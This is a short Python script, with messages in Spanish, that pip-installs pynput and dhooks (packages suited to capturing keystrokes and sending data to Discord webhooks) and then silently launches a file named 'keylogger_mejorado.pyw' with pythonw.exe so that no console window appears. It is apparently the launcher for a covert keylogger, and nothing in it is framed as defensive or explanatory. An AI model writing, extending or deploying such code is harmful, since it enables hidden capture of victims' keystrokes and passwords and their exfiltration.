import os
import sys
import subprocess
import time


def install(package):
    try:
        os.system(f"pip install {package}")
        print(f"{package} se ha instalado correctamente.")
        return True
    except Exception as e:
        print(f"Error durante la instalación de {package}: {e}")
        return False

# Lista de paquetes a instalar
paquetes = ['pynput', 'dhooks', 'logging', 'schedule']

for paquete in paquetes:
    if not install(paquete):
        print(f"Hubo un problema durante la instalación de {paquete}.")

os.system("pythonw.exe F:\keylogger_mejorado.pyw")

time.sleep(20)  

sys.exit()

